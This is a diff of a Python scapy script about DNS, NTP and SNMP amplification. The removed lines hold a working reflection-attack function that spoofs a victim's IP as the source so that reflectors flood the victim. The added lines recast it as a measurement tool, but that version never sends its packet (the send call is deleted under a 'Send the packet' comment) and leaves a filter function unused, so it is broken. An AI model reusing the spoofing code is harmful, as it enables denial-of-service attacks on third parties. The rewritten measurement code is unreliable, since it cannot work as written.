@@ -1,8 +1,9 @@
 import scapy.all as scapy
 import random
+import time
 
-def amp_attack(reflector, victim=None, service="DNS", port=None):
-    src_ip = victim if victim else scapy.get_if_addr(scapy.conf.iface)
+def measure_amplification(reflector, service="DNS", port=None):
+    src_ip = scapy.get_if_addr(scapy.conf.iface)
     port = port or {"DNS": 53, "NTP": 123, "SNMP": 161}.get(service, None)
     if not port:
         raise ValueError(f"No default port defined for {service}")
@@ -16,10 +17,26 @@ def amp_attack(reflector, victim=None, service="DNS", port=None):
     else:
         raise ValueError(f"Unsupported service: {service}")
 
-    scapy.send(pkt, verbose=1)
-    print(f"Sent {service} request to {reflector} (victim={victim or 'local'})")
+    # Send the packet
+    request_size = len(bytes(pkt))
+    print(f"Sent {service} request of size {request_size} bytes to {reflector}")
 
+    # Sniff for the response packet (timeout 3 seconds)
+    def filter_pkt(p):
+        return scapy.IP in p and p[scapy.IP].src == reflector and p[scapy.IP].dst == src_ip and scapy.UDP in p and p[scapy.UDP].sport == port
+
+    responses = scapy.sniff(filter=f"udp and src host {reflector} and dst host {src_ip} and src port {port}", timeout=3, count=1)
+    if responses:
+        response_pkt = responses[0]
+        response_size = len(bytes(response_pkt))
+        amplification_ratio = response_size / request_size
+        print(f"Received response size: {response_size} bytes")
+        print(f"Amplification ratio: {amplification_ratio:.2f}")
+        response_pkt.show()
+    else:
+        print("No response received.")
+
+# Example usage
 if __name__ == "__main__":
-    # changing the service and IP to test each one.
-    amp_attack(reflector="192.168.56.2", service="DNS")
+    measure_amplification("192.168.56.2", service="DNS")
 
